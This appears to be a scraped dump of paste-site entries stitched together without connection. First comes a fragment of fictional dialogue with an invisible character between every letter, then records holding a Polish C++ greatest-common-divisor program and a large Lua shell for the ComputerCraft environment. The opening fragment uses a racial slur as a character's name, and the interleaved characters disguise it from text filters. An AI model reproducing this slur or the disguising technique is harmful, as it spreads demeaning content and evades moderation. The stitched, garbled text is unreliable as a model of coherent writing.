‚Äék‚Äén‚Äéo‚Äéw‚Äé ‚Äéw‚Äéh‚Äéa‚Äét‚Äé.‚Äé ‚ÄéC‚Äéo‚Äém‚Äée‚Äé ‚Äéo‚Äén‚Äé.‚Äé ‚ÄéG‚Äéi‚Äém‚Äém‚Äée‚Äé ‚Äéa‚Äé ‚Äéb‚Äér‚Äée‚Äéa‚Äék‚Äé.‚Äé ‚ÄéA‚Äél‚Äér‚Äéi‚Äég‚Äéh‚Äét‚Äé,‚Äé ‚Äéf‚Äéi‚Äén‚Äée‚Äé,‚Äé ‚ÄéI‚Äé'‚Äél‚Äél‚Äé ‚Äél‚Äée‚Äéa‚Äév‚Äée‚Äé.‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚ÄéB‚Äéu‚Äét‚Äé ‚ÄéI‚Äé ‚Äéh‚Äéo‚Äép‚Äée‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚ÄéG‚Äéo‚Äéd‚Äé ‚Äéw‚Äéi‚Äél‚Äél‚Äé ‚Äéf‚Äéo‚Äér‚Äég‚Äéi‚Äév‚Äée‚Äé ‚Äéy‚Äéo‚Äéu‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéb‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äés‚Äéo‚Äé ‚Äéh‚Äée‚Äéa‚Äér‚Äét‚Äél‚Äée‚Äés‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéc‚Äér‚Äéu‚Äée‚Äél‚Äé,‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé!‚Äé

D‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé:‚Äé ‚ÄéH‚Äée‚Äé ‚Äép‚Äér‚Äéo‚Äéb‚Äéa‚Äéb‚Äél‚Äéy‚Äé ‚Äéw‚Äéi‚Äél‚Äél‚Äé.‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé
N‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé!‚Äé



M‚Äéa‚Äén‚Äéy‚Äé ‚Äép‚Äée‚Äéo‚Äép‚Äél‚Äée‚Äé ‚Äéa‚Äét‚Äét‚Äée‚Äém‚Äép‚Äét‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äéd‚Äée‚Äét‚Äéa‚Äéi‚Äén‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé,‚Äé ‚Äéh‚Äéo‚Äéw‚Äée‚Äév‚Äée‚Äér‚Äé,‚Äé ‚Äéh‚Äée‚Äé ‚Äée‚Äés‚Äéc‚Äéa‚Äép‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äér‚Äéo‚Äéu‚Äég‚Äéh‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéj‚Äéa‚Äéi‚Äél‚Äé ‚Äéc‚Äée‚Äél‚Äél‚Äé'‚Äés‚Äé ‚Äéb‚Äéa‚Äér‚Äés‚Äé.‚Äé ‚ÄéB‚Äée‚Äéf‚Äéo‚Äér‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äéy‚Äé ‚Äéc‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚Äép‚Äéu‚Äét‚Äé ‚Äéh‚Äéi‚Äém‚Äé ‚Äéi‚Äén‚Äé ‚Äéa‚Äé ‚Äém‚Äéa‚Äéx‚Äéi‚Äém‚Äéu‚Äém‚Äé ‚Äés‚Äée‚Äéc‚Äéu‚Äér‚Äéi‚Äét‚Äéy‚Äé ‚Äép‚Äér‚Äéi‚Äés‚Äéo‚Äén‚Äé,‚Äé ‚Äéh‚Äée‚Äé ‚Äéf‚Äél‚Äée‚Äéw‚Äé ‚Äét‚Äéo‚Äé ‚Äéa‚Äé ‚Äéc‚Äéo‚Äéu‚Äén‚Äét‚Äér‚Äéy‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéa‚Äér‚Äéc‚Äét‚Äéi‚Äéc‚Äé ‚Äéc‚Äéi‚Äér‚Äéc‚Äél‚Äée‚Äé,‚Äé ‚Äéi‚Äén‚Äés‚Äéi‚Äéd‚Äée‚Äé ‚Äéa‚Äé ‚Äéc‚Äéa‚Äév‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚Äéa‚Äén‚Äé ‚Äéu‚Äén‚Äék‚Äén‚Äéo‚Äéw‚Äén‚Äé ‚Äém‚Äéo‚Äéu‚Äén‚Äét‚Äéa‚Äéi‚Äén‚Äé.‚Äé"
D7CyrUmG,Untitled,MeehoweCK,C++,Monday 29th of January 2024 08:19:08 AM CDT,"#include <iostream>

using namespace std;

int main() {
	unsigned int a, b;
	cout << ""Wpisz dwie liczby naturalne: "";
	cin >> a >> b;
	if (a == 0 || b == 0) {
		cout << ""Te liczby nie posiadaja wspolnego dzielnika.\n"";
	}
	else {
		auto x{ a }, y{ b };		// automatyczne przypisanie typu zmiennej
		while (x != y) {
			if (x > y) {
				x -= y;
			}
			if (y > x) {
				y -= x;
			}
		}
		cout << ""Najwiekszym wspolnym dzielnikiem liczb "" << a << "" i "" << b << "" jest liczba "" << x << "".\n"";
	}
	return 0;
}"
dxKtQSgA,DOOR-OS-cashshell.lua,Chomudit,Lua,Monday 29th of January 2024 08:14:35 AM CDT,"--[[
MIT License

Copyright (c) 2019-2020 JackMacWindows

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
]]--

-- To silence IDE warnings
kernel = kernel
users = users
signal = signal

local topshell = _ENV.shell
local shell = {}
local multishell = {}
local pack = {}
_ENV.package = nil
_G.package = nil
package = nil
_ENV.require = nil
_G.require = nil
local start_time = os.epoch()
local args = {...}
local running = true
local shell_retval = 0
local shell_title = nil
local execCommand
local shell_env = _ENV
local pausedJob
local CCKernel2 = kernel and users and kernel.getPID
local OpusOS = kernel and kernel.hook
local make_require = dofile(""/rom/modules/main/cc/require.lua"").make
local expect = dofile(""/rom/modules/main/cc/expect.lua"").expect

if table.maxn == nil then table.maxn = function(t) local i = 1 while t[i] ~= nil do i = i + 1 end return i - 1 end end

local function trim(s) return string.match(s, '^()%s*$') and '' or string.match(s, '^%s*(.*%S)') end

HOME = ""/""
SHELL = topshell and topshell.getRunningProgram() or ""/usr/bin/cash""
PATH = topshell and string.gsub(topshell.path(), ""%.:"", """") or ""/rom/programs:/rom/programs/fun:/rom/programs/rednet""
USER = CCKernel2 and users.getShortName(users.getuid()) or ""root""
EDITOR = ""edit""
OLDPWD = topshell and topshell.dir() or ""/""
PWD = topshell and topshell.dir() or ""/""
SHLVL = SHLVL and SHLVL + 1 or 1
TERM = ""craftos""
COLORTERM = ""16color""

local vars = {
    PS1 = ""\\s-\\v\\$ "",
    PS2 = ""> "",
    IFS = ""\n"",
    CASH = topshell and topshell.getRunningProgram() or ""cash.lua"",
    CASH_VERSION = ""0.3"",
    RANDOM = function() return math.random(0, 32767) end,
    SECONDS = function() return math.floor((os.epoch() - start_time) / 1000) end,
    HOSTNAME = os.getComputerLabel(),
    TERMINATE_QUIT = ""no"",
    [""*""] = table.concat(args, "" ""),
    [""@""] = function() return table.concat(args, "" "") end,
    [""#""] = #args,
    [""?""] = 0,
    [""0""] = topshell and topshell.getRunningProgram() or ""cash.lua"",
    _ = topshell and topshell.getRunningProgram() or ""cash.lua"",
    [""$""] = CCKernel2 and kernel.getPID() or (OpusOS and kernel.getCurrent() or 0),
}

local aliases = topshell and topshell.aliases() or {}
local completion = topshell and topshell.getCompletionInfo() or {}
local if_table, if_statement = {}, 0
local while_table, while_statement = {}, 0
local case_table, case_statement = {}, 0
local function_name = nil
local functions = {}
local history = {}
local historyfile
local run_tokens
local function_running = false
local should_break = false
local no_funcs = false
local dirstack = {}
local jobs = {}
local completed_jobs = {}

local builtins
builtins = {
    ["":""] = function() return 0 end,
    ["".""] = function(path)
        path = fs.exists(path) and path or shell.resolve(path)
        local file = io.open(path, ""r"")
        if not file then return 1 end
        vars.LINENUM = 1
        for line in file:lines() do 
            shell.run(line) 
            vars.LINENUM = vars.LINENUM + 1
        end
        vars.LINENUM = nil
        file:close()
    end,
    echo = function(...) print(...); return 0 end,
    builtin = function(name, ...) return builtins[name](...) end,
    cd = function(dir)
        if not fs.isDir(shell.resolve(dir or ""/"")) then 
            printError(""cash: cd: "" .. dir .. "": No such file or directory"")
            return 1
        end
        OLDPWD = PWD
        PWD = shell.resolve(dir or ""/"") 
    end,
    command = function(...) no_funcs = true; shell.run(...); no_funcs = false; return vars[""?""] end,
    complete = function() end, -- TODO
    eval = function(...) shell.run(...); return vars[""?""] end,
    exec = function(...) execCommand = table.concat({...}, ' '); shell.exit() end,
    exit = shell.exit,
    export = function(...)
        local vars = {...}
        if #vars == 0 or vars[1] == ""-p"" then for k,v in pairs(_ENV) do if type(v) == ""string"" or type(v) == ""number"" then print(""export "" .. k .. ""="" .. v) end end else
            for k,v in ipairs(vars) do
                local kk, vv = string.match(v, ""(.+)=(.+)"")
                if not (kk == nil or vv == nil) and (_ENV[kk] == nil or type(_ENV[kk]) == ""string"" or type(_ENV[kk]) == ""number"") then _ENV[kk] = vv end
            end
        end
    end,
    history = function(...)
        if ({...})[1] == ""-c"" then
            historyfile.close()
            historyfile = fs.open(CCKernel2 and ""/~/.cash_history"" or "".cash_history"", ""w"")
            history = {}
            return
        end
        local lines = {}
        for k,v in ipairs(history) do print("" "" .. k .. string.rep("" "", math.floor(math.log10(#history)) - math.floor(math.log10(k)) + 2) .. v) end
        --textutils.tabulate(table.unpack(lines))
    end,
    jobs = function(...)
        local filter = {...}
        for k,v in pairs(jobs) do if v.cmd ~= ""jobs"" then
            if #filter == 0 then print(""["" .. k .. ""]+  "" .. (v.paused and ""Paused"" or ""Running"") .. ""  "" .. v.cmd) 
            else for l,w in ipairs(filter) do 
                if k == w then print(""["" .. k .. ""]+  "" .. (v.paused and ""Paused"" or ""Running"") .. ""  "" .. v.cmd) end 
            end end 
        end end
    end,
    pushd = function(newdir)
        table.insert(dirstack, PWD)
        if newdir then PWD = shell.resolve(newdir) end
        write((PWD == """" and ""/"" or PWD) .. "" "")
        for i = #dirstack, 1, -1 do write((dirstack[i] == """" and ""/"" or dirstack[i]) .. "" "") end
        print()
    end,
    popd = function()
        if #dirstack == 0 then
            printError(""cash: popd: directory stack empty"")
            return -1
        end
        PWD = table.remove(dirstack, #dirstack)
        write((PWD == """" and ""/"" or PWD) .. "" "")
        for i = #dirstack, 1, -1 do write((dirstack[i] == """" and ""/"" or dirstack[i]) .. "" "") end
        print()
    end,
    dirs = function()
        write((PWD == """" and ""/"" or PWD) .. "" "")
        for i = #dirstack, 1, -1 do write((dirstack[i] == """" and ""/"" or dirstack[i]) .. "" "") end
        print()
    end,
    pwd = function() print(PWD) end,
    read = function(var) -- TODO: expand
        vars[var] = read()
    end,
    set = function(...)
        local lvars = {...}
        if #lvars == 0 then for k,v in pairs(vars) do print(k .. ""="" .. v) end else
            for k,v in ipairs(lvars) do
                if string.find(v, ""="") then
                    local kk, vv = string.match(v, ""(.+)=(.+)"")
                    vars[kk] = vv
                end
            end
        end
    end,
    alias = function(...)
        local vars = {...}
        if #vars == 0 or vars[1] == ""-p"" then for k,v in pairs(aliases) do print(""alias "" .. k .. ""="" .. v) end else
            for k,v in ipairs(vars) do
                local kk, vv = string.match(v, ""(.+)=(.+)"")
                aliases[kk] = vv
            end
        end
    end,
    sleep = function(time) sleep(tonumber(time)) end,
    test = function(...) -- TODO: add and/or
        local args = {...}
        if #args < 1 then
            printError(""cash: test: unary operator expected"")
            return -1
        end
        local function n(v) return v end
        if args[1] == ""!"" then
            table.remove(args, 1)
            n = function(v) return not v end
        end
        if string.sub(args[1], 1, 1) == ""-"" then
            if args[2] == nil then return n(true)
            elseif args[1] == ""-d"" then return n(fs.exists(shell.resolve(args[2])) and fs.isDir(shell.resolve(args[2])))
            elseif args[1] == ""-e"" then return n(fs.exists(shell.resolve(args[2])))
            elseif args[1] == ""-f"" then return n(fs.exists(shell.resolve(args[2])) and not fs.isDir(shell.resolve(args[2])))
            elseif args[1] == ""-n"" then return n(#args[2] > 0)
            elseif args[1] == ""-s"" then return n(fs.getSize(shell.resolve(args[2])) > 0)
            elseif args[1] == ""-u"" and type(CCKernel2) == ""table"" then return n(fs.hasPermissions(shell.resolve(args[2]), fs.permissions.setuid))
            elseif args[1] == ""-w"" then return n(not fs.isReadOnly(shell.resolve(args[2])))
            elseif args[1] == ""-x"" then return n(true)
            elseif args[1] == ""-z"" then return n(#args[2] == 0)
            else return n(false) end
        elseif args[3] and string.sub(args[2], 1, 1) == ""-"" then
            if args[2] == ""-eq"" then return n(tonumber(args[1]) == tonumber(args[3]))
            elseif args[2] == ""-ne"" then return n(tonumber(args[1]) ~= tonumber(args[3]))
            elseif args[2] == ""-lt"" then return n(tonumber(args[1]) < tonumber(args[3]))
            elseif args[2] == ""-gt"" then return n(tonumber(args[1]) > tonumber(args[3]))
            elseif args[2] == ""-le"" then return n(tonumber(args[1]) <= tonumber(args[3]))
            elseif args[2] == ""-ge"" then return n(tonumber(args[1]) >= tonumber(args[3]))
            else return n(false) end
        elseif args[2] == ""="" then return n(args[1] == args[3])
        elseif args[2] == ""!="" then return n(args[1] ~= args[3])
        else
            printError(""cash: test: unary operator expected"")
            return 2
        end
    end,
    [""true""] = function() return 0 end,
    [""false""] = function() return 1 end,
    unalias = function(...) for k,v in ipairs({...}) do aliases[v] = nil end end,
    unset = function(...) for k,v in ipairs({...}) do vars[v] = nil end end,
    wait = function(job)
        if job then while jobs[tonumber(job)] ~= nil do sleep(0.1) end
        else while table.maxn(jobs) ~= 0 do sleep(0.1) end end
    end,
    lua = function(...)
        if #({...}) > 0 then
            if fs.exists(shell.resolve(...)) then
                local args = {...}
                table.remove(args, 1)
                shell.run(shell.resolve(...), table.unpack(args)) 
            else
                local s = table.concat({...}, "" "")
                local tEnv = setmetatable({shell = shell, multishell = multishell, package = pack, require = require, _echo = function(...) return ... end}, {__index = _ENV})
                local nForcePrint = 0
                local func, e = load( s, ""lua"", ""t"", tEnv )
                local func2, e2 = load( ""return _echo(""..s.."");"", ""lua"", ""t"", tEnv )
                if not func then
                    if func2 then
                        func = func2
                        e = nil
                        nForcePrint = 1
                    end
                else
                    if func2 then
                        func = func2
                    end
                end
                if func then
                    local tResults = table.pack( pcall( func ) )
                    if tResults[1] then
                        local n = 1
                        while n < tResults.n or (n <= nForcePrint) do
                            local value = tResults[ n + 1 ]
                            if type( value ) == ""table"" then
                                local metatable = getmetatable( value )
                                if type(metatable) == ""table"" and type(metatable.__tostring) == ""function"" then
                                    print( tostring( value ) )
                                else
                                    local ok, serialised = pcall( textutils.serialise, value )
                                    if ok then
                                        print( serialised )
                                    else
                                        print( tostring( value ) )
                                    end
                                end
                            else
                                print( tostring( value ) )
                            end
                            n = n + 1
                        end
                    else
                        printError( tResults[2] )
                    end
                else
                    printError( e )
                end
            end
        else shell.run(""/rom/programs/lua.lua"") end
    end,
    cat = function(...)
        for k,v in ipairs({...}) do
            local file = fs.open(v, ""r"")
            if file ~= nil then
                print(file.readAll())
                file.close()
            end
        end
    end,
    which = function(name) local name, v = shell.resolveProgram(name); if not v and name then print(name) end end,
    [""if""] = function(...)
        shell.run(...)
        table.insert(if_table, {cond = vars[""?""] == 0, inv = false})
    end,
    [""then""] = function(...) 
        if if_statement >= table.maxn(if_table) then
            printError(""cash: syntax error near unexpected token `then'"")
            return -1
        end
        if_statement = if_statement + 1
        shell.run(...) 
        return vars[""?""]
    end,
    [""else""] = function(...)
        if if_statement < 1 or if_table[if_statement].inv then
            printError(""cash: syntax error near unexpected token `else'"")
            return -1
        end
        if_table[if_statement].inv = true
        if_table[if_statement].cond = not if_table[if_statement].cond
        shell.run(...)
        return vars[""?""]
    end,
    fi = function()
        if if_statement < 1 then
            printError(""cash: syntax error near unexpected token `fi'"")
            return -1
        end
        table.remove(if_table, if_statement)
        if_statement = if_statement - 1
    end,
    [""while""] = function(...)
        table.insert(while_table, {cond = {...}, lines = {}})
    end,
    [""do""] = function(...)
        if table.maxn(while_table) == 0 then
            printError(""cash: syntax error near unexpected token `do'"")
            return -1
        end
        while_statement = while_statement + 1
    end,
    done = function()
        if while_statement < 1 then
            printError(""cash: syntax error near unexpected token `done'"")
            return -1
        end
        while_statement = while_statement - 1
        if while_statement == 0 then
            local last = table.remove(while_table, while_statement + 1)
            if type(last.cond) == ""function"" then last.cond()
            else shell.run(table.unpack(last.cond)) end
            local cond = vars[""?""]
            should_break = false
            while cond == 0 and not should_break do
                for k,v in ipairs(last.lines) do 
                    if type(v) == ""function"" then v()
                    else shell.run(v) end
                end
                if type(last.cond) == ""function"" then last.cond()
                else shell.run(table.unpack(last.cond)) end
                cond = vars[""?""]
            end
        end
    end,
    [""break""] = function() should_break = true end,
    [""for""] = function(...)
        local args = {...}
        if args[2] ~= ""in"" then
            printError(""cash: missing `in' in for loop"")
            return -1
        end
        local i = 2
        table.insert(while_table, {cond = function() i = i + 1; vars[""?""] = args[i] ~= nil and 0 or 1 end, lines = {function() vars[args[1]] = args[i] end}})
    end,
    [""function""] = function(name, p)
        if function_name ~= nil then
            printError(""cash: syntax error near unexpected token `function'"")
            return -1
        end
        if p ~= ""{"" then
            printError(""cash: syntax error near token `"" .. name .. ""'"")
            return -1
        end
        function_name = name
        functions[function_name] = {}
    end,
    [""}""] = function() 
        if function_name == nil then
            printError(""cash: syntax error near unexpected token `}'"")
            return -1
        end
        function_name = nil 
    end,
    [""return""] = function(var)
        if function_running == false then
            printError(""cash: syntax error near unexpected token `return'"")
            return -1
        end
        function_running = false
        return var
    end,
    bg = function(t)
        if pausedJob then 
            jobs[pausedJob].isfg = false
            jobs[pausedJob].paused = false
            if CCKernel2 then kernel.signal(signal.SIGCONT, jobs[pausedJob].pid) end
            pausedJob = nil
            return 0
        elseif tonumber(t) and jobs[tonumber(t)] then
            local task = tonumber(t)
            jobs[task].isfg = false
            jobs[task].paused = false
            if CCKernel2 then kernel.signal(signal.SIGCONT, jobs[task].pid) end
            return 0
        else
            printError(""cash: bg: current: no such job"")
            return 1
        end
    end,
    fg = function(t)
        if pausedJob then 
            jobs[pausedJob].isfg = true
            jobs[pausedJob].paused = false
            if CCKernel2 then kernel.signal(signal.SIGCONT, jobs[pausedJob].pid) end
            pausedJob = nil
            return 0
        elseif tonumber(t) and jobs[tonumber(t)] then
            local task = tonumber(t)
            jobs[task].isfg = true
            jobs[task].paused = false
            if CCKernel2 then kernel.signal(signal.SIGCONT, jobs[task].pid) end
            return 0
        else
            printError(""cash: fg: current: no such job"")
            return 1
        end
    end,
}
builtins[""[""] = builtins.test

function shell.exit(retval)
    running = false
    shell_retval = retval or 0
end

function shell.dir()
    return PWD
end

function shell.setDir(path)
    expect(1, path, ""string"")
    OLDPWD = PWD
    PWD = path
end

function shell.path()
    return PATH
end

function shell.setPath(path)
    expect(1, path, ""string"")
    PATH = path
end

function shell.resolve(localPath)
    expect(1, localPath, ""string"")
    if string.sub(localPath, 1, 1) == ""/"" then return fs.combine(localPath, """")
    else return fs.combine(PWD, localPath) end
end

function shell.resolveProgram(name)
    expect(1, name, ""string"")
    if builtins[name] ~= nil then return name end
    if aliases[name] ~= nil then name = aliases[name] end
    for path in string.gmatch(PATH, ""[^:]+"") do
        if fs.exists(fs.combine(shell.resolve(path), name)) and not fs.isDir(fs.combine(shell.resolve(path), name)) then return fs.combine(shell.resolve(path), name)
        elseif fs.exists(fs.combine(shell.resolve(path), name .. "".lua"")) and not fs.isDir(fs.combine(shell.resolve(path), name .. "".lua"")) then return fs.combine(shell.resolve(path), name .. "".lua"") end
    end
    if fs.exists(shell.resolve(name)) and not fs.isDir(shell.resolve(name)) then return shell.resolve(name), string.find(name, ""/"") == nil end
    if fs.exists(shell.resolve(name .. "".lua"")) and not fs.isDir(shell.resolve(name .. "".lua"")) then return shell.resolve(name .. "".lua""), string.find(name, ""/"") == nil end
    return nil
end

function shell.aliases()
    return aliases
end

function shell.setAlias(alias, program)
    expect(1, alias, ""string"")
    expect(2, program, ""string"")
    aliases[alias] = program
end

function shell.clearAlias(alias)
    expect(1, alias, ""string"")
    aliases[alias] = nil
end

local function combineArray(dst, src, prefix)
    for k,v in ipairs(src) do table.insert(dst, (prefix or """") .. v) end
    return dst
end

function shell.programs(showHidden)
    -- todo: implement showHidden
    local retval = {}
    for path in string.gmatch(PATH, ""[^:]+"") do combineArray(retval, fs.find(fs.combine(shell.resolve(path), ""*""))) end
    combineArray(retval, fs.find(fs.combine(PWD, ""*"")), ""./"")
    return retval
end

function shell.getRunningProgram()
    return vars._
end

function shell.complete(prefix)
    expect(1, prefix, ""string"")
    return fs.complete(prefix, PWD)
end

function shell.completeProgram(prefix)
    expect(1, prefix, ""string"")
    if string.find(prefix, ""/"") then
        return fs.complete(prefix, PWD, true, false)
    else
        local retval = {}
        for path in string.gmatch(PATH, ""[^:]+"") do combineArray(retval, fs.complete(prefix, path, true, false)) end
        return retval
    end
end

function shell.setCompletionFunction(path, completionFunction)
    expect(1, path, ""string"")
    expect(2, completionFunction, ""function"")
    completion[path] = {fnComplete = completionFunction}
end

function shell.getCompletionInfo()
    return completion
end

function shell.switchTab() end

function multishell.getCurrent()
    return 1
end

function multishell.getCount()
    return 1
end

function multishell.setFocus(id)
    expect(1, id, ""number"")
    return id == 1
end

function multishell.setTitle(title) 
    shell_title = title   
end

function multishell.getTitle()
    return shell_title
end

function multishell.getFocus()
    return 1
end

function shell.environment()
    return shell_env
end

function shell.setEnvironment(e)
    expect(1, e, ""table"")
    shell_env = e
end

local function expandVar(var)
    if string.sub(var, 1, 1) ~= ""$"" then return nil end
    if string.sub(var, 2, 2) == ""{"" then
        local varname = string.sub(string.match(var, ""%b{}""), 2, -2)
        local retval = _ENV[varname] or vars[varname]
        if type(retval) == ""function"" then return retval(), #varname + 2 else return retval or """", #varname + 2 end
    elseif string.sub(var, 2, 3) == ""(("" then
        local expr = string.gsub(string.sub(string.match(string.sub(var, 3), ""%b()""), 2, -2), ""%$"", """")
        local fn = loadstring(""return "" .. expr)
        local varenv = setmetatable({}, {__index = _ENV})
        for k,v in pairs(vars) do varenv[k] = v end
        setfenv(fn, varenv)
        return tostring(fn()), #expr + 4
    elseif tonumber(string.sub(var, 2, 2)) then
        local varname = tonumber(string.match(string.sub(var, 2, 2), ""[0-9]+""))
        if varname == 0 then return vars[""0""], 1 else return args[varname] or """", math.floor(math.log10(varname)) + 1 end
    else
        local varname = """"
        for c in string.gmatch(string.sub(var, 2), ""."") do
            if c == "" "" then return """", #varname end
            varname = varname .. c
            if _ENV[varname] or vars[varname] then
                local retval = _ENV[varname] or vars[varname]
                if type(retval) == ""function"" then return retval(), #varname else return retval or """", #varname end
            end
        end
        return """", #var - 1
    end
end

local function splitSemicolons(cmdline)
    local escape = false
    local quoted = false
    local j = 1
    local retval = {""""}
    local lastc, lastc2
    for c in string.gmatch(cmdline, ""."") do
        if lastc == '&' and c ~= '&' and lastc2 ~= '&' and not quoted and not escape then
            j=j+1
            retval[j] = """"
        end
        local setescape = false
        if c == '""' or c == '\'' and not escape then quoted = not quoted
        elseif c == '\\' and not quoted and not escape then 
            setescape = true
            escape = true
        end
        if c == ';' and not quoted and not escape then
            j=j+1
            retval[j] = """"
        elseif not (c == ' ' and retval[j] == """") then retval[j] = retval[j] .. c end
        if not setescape then escape = false end
        lastc2 = lastc
        lastc = c
    end
    return retval
end

local function tokenize(cmdline, noexpand)
    -- Expand vars
    local singleQuote = false
    local escape = false
    local expstr = """"
    local i = 1
    local function tostr(v)
        if type(v) == ""boolean"" then return v and ""true"" or ""false""
        elseif v == nil then return ""nil""
        elseif type(v) == ""table"" then return textutils.serialize(v)
        elseif type(v) == ""string"" then return v
        else return tostring(v) end
    end
    if noexpand then expstr = cmdline else
        while i <= #cmdline do
            local c = string.sub(cmdline, i, i)
            if c == '$' and not escape and not singleQuote then
                local s, n = expandVar(string.sub(cmdline, i))
                s = tostr(s)
                expstr = expstr .. s
                i = i + n
            else
                if c == '\'' and not escape then singleQuote = not singleQuote end
                escape = c == '\\' and not escape
                expstr = expstr .. c
            end
            i=i+1
        end
    end
    -- Tokenize
    local retval = {{[0] = """"}}
    i = 0
    local j = 1
    local quoted = false
    escape = false
    local lastc
    for c in string.gmatch(expstr, ""."") do
        if (c == '""' or c == '\'') and not escape then quoted = not quoted
        elseif c == ' ' and not quoted and not escape then
            if #retval[j][i] > 0 then
                i=i+1
                retval[j][i] = """"
            end
        elseif c == ';' and not quoted and not escape then
            j=j+1
            i=0
            retval[j] = {[0] = """"}
        elseif lastc == '&' and c == '&' and not quoted and not escape then
            retval[j][i] = string.sub(retval[j][i], 1, -2)
            j=j+1
            i=0
            retval[j] = {[0] = """", last = 0}
        elseif lastc == '|' and c == '|' and not quoted and not escape then
            retval[j][i] = string.sub(retval[j][i], 1, -2)
            j=j+1
            i=0
            retval[j] = {[0] = """", last = 1}
        elseif not (c == '\\' and not quoted and not escape) then
            retval[j][i] = retval[j][i] .. c 
        end
        escape = c == '\\' and not quoted and not escape
        lastc = c
    end
    if lastc == '&' then retval.async = true end
    for k,v in ipairs(retval) do if v[0] ~= """" then
        local path, islocal = shell.resolveProgram(v[0])
        path = path or v[0]
        if not (islocal and string.find(v[0], ""/"") == nil) then v[0] = path end
        v.vars = {}
        while v[0] and string.find(v[0], ""="") do
            local l = string.sub(v[0], 1, string.find(v[0], ""="") - 1)
            v.vars[l] = string.sub(v[0], string.find(v[0], ""="") + 1)
            v.vars[l] = tonumber(v.vars[l]) or v.vars[l]
            v[0] = nil
            for i = 1, table.maxn(v) do v[i-1] = v[i]; v[i] = nil end
        end
    end end
    return retval
end

local junOff = 31 + 28 + 31 + 30 + 31 + 30
local function dayToString(day)
    if day <= 31 then return ""Jan "" .. day
    elseif day > 31 and day <= 31 + 28 then return ""Feb "" .. day - 31
    elseif day > 31 + 28 and day <= 31 + 28 + 31 then return ""Mar "" .. day - 31 - 28
    elseif day > 31 + 28 + 31 and day <= 31 + 28 + 31 + 30 then return ""Apr "" .. day - 31 - 28 - 31
    elseif day > 31 + 28 + 31 + 30 and day <= 31 + 28 + 31 + 30 + 31 then return ""May "" .. day - 31 - 28 - 31 - 30
    elseif day > 31 + 28 + 31 + 30 + 31 and day <= junOff then return ""Jun "" .. day - 31 - 28 - 31 - 30 - 31
    elseif day > junOff and day <= junOff + 31 then return ""Jul "" .. day - junOff
    elseif day > junOff + 31 and day <= junOff + 31 + 31 then return ""Aug "" .. day - junOff - 31
    elseif day > junOff + 31 + 31 and day <= junOff + 31 + 31 + 30 then return ""Sep "" .. day - junOff - 31 - 31
    elseif day > junOff + 31 + 31 + 30 and day <= junOff + 31 + 31 + 30 + 31 then return ""Oct "" .. day - junOff - 31 - 31 - 30
    elseif day > junOff + 31 + 31 + 30 + 31 and day <= junOff + 31 + 31 + 30 + 31 + 30 then return ""Nov "" .. day - junOff - 31 - 31 - 30 - 31
    else return ""Dec "" .. day - junOff - 31 - 31 - 30 - 31 - 30 end
end

local function getPrompt()
    local retval = (if_statement > 0 or while_statement > 0 or case_statement > 0) and vars.PS2 or vars.PS1 or ""\\$ ""
    for k,v in pairs({
        [""\\d""] = dayToString(os.day()),
        [""\\e""] = string.char(0x1b),
        [""\\h""] = string.sub(os.getComputerLabel() or ""localhost"", 1, string.find(os.getComputerLabel() or ""localhost"", ""%."")),
        [""\\H""] = os.getComputerLabel() or ""localhost"",
        [""\\n""] = ""\n"",
        [""\\s""] = string.gsub(fs.getName(vars[""0""]), "".lua"", """"),
        [""\\t""] = textutils.formatTime(os.time(), true),
        [""\\T""] = textutils.formatTime(os.time(), false),
        [""\\u""] = USER,
        [""\\v""] = vars.CASH_VERSION,
        [""\\V""] = vars.CASH_VERSION,
        [""\\w""] = PWD,
        [""\\W""] = fs.getName(PWD) == ""."" and ""/"" or fs.getName(PWD),
        [""\\%#""] = vars.LINENUM,
        [""\\%$""] = USER == ""root"" and ""#"" or ""$"",
        [""\\([0-7][0-7][0-7])""] = function(n) return string.char(tonumber(n, 8)) end,
        [""\\\\""] = ""\\"",
        [""\\%[.+\\%]""] = """"
    }) do retval = string.gsub(retval, k, v) end
    return retval
end

